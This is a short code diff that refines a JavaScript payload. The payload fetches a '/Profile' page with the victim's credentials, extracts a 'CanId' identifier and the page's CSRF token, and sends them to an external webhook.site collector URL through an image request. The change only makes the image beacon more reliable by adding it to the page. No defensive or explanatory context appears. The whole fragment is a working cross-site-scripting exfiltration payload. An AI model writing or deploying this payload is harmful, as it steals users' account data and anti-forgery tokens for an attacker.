@@ -9,5 +9,7 @@ fetch('/Profile',{credentials:'include'})
       canId:(d.match(/CanId":(\d+)/)||[])[1]||'',
       csrf:window._CSRFToken
     };
-    new Image().src='https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?d='+encodeURIComponent(JSON.stringify(data));
+    var img = new Image();
+    img.src = 'https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?d=' + encodeURIComponent(JSON.stringify(data));
+    document.body.appendChild(img);
   })
